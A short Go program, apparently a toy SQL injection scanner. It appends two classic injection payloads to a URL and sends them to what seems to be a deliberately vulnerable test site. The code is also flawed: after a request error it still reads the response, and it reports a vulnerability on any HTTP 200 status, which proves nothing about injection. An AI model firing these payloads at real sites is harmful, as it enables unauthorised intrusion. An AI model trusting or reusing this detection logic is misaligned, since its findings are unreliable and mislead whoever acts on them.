package main

import (
    "net/http"
    "fmt"
)

func scan(url string) {
    // These are common SQL injection payloads
    payloads := []string{"' OR 1=1; --", "' OR '1'='1"}

    for _, payload := range payloads {
        resp, err := http.Get(url + payload)
        if err != nil {
            fmt.Printf("Error checking URL: %s\n", err)
        }
        if resp.StatusCode == 200 {
            fmt.Printf(" [*] SQL Injection Vulnerability Found In %s\n", url)
            break
        }
    }
}

func main() {
    // Test the scanner with a vulnerable URL
    scan("http://testphp.vulnweb.com/artists.php?artist=1")
}
